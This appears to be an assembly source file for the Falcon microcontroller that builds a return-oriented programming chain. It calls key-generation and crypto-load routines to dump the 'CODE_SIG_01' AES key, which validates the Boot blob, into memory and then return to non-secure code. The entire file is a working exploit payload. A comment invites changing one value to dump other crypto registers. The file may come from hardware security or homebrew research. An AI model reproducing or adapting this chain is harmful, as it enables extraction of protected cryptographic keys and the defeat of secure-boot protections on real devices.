//
// A ROP chain designed to dump the "CODE_SIG_01" AES key that is used to
// validate the Boot blob through an AES-CMAC operation.
//
// gen_usr_key(0, 0);
// crypto_load(4, 0x9A0);
//

// We're going to copy the resulting key to this address in Falcon DMem.
.equ #ROP_KEY_BUFFER 0x9A0

.size 0x998
.section #rop_payload 0x998

// mpopret $r0
.b32 0x53D
.b32 0

// mov $r10 0x0
// ret
.b32 0x5B4

// $r0  = 0
// $r10 = 0
// ------------------
// mov b32 $r11 $r0
// lcall #crypto_load
// mpopret $r0
.b32 0x6B1
.b32 0

// $r10 = 0
// $r11 = 0
// -----------------
// lbra #gen_usr_key
.b32 0x647

// mpopret $r0
.b32 0x53D
.b32 0x4  // <- Change this value if you want to dump other crypto registers.

// $r0  = 4
// -------------------
// mov b32 $r10 $r0
// add $sp 0x4
// mpopaddret $r4 0x20
.b32 0x4EE
.b32 0
.b32 0

// mpopaddret sucks
.b32 0
.b32 0
.b32 0
.b32 0
.b32 0
.b32 0
.b32 0
.b32 0
.b32 0
.b32 0
.b32 0
.b32 0

// $r10 = 4
// $r11 = 9A0
// ------------------
// lbra #crypto_load
.b32 0x5BD

// We have everything we need. Return to No Secure Mode code.
.b32 #ret2win
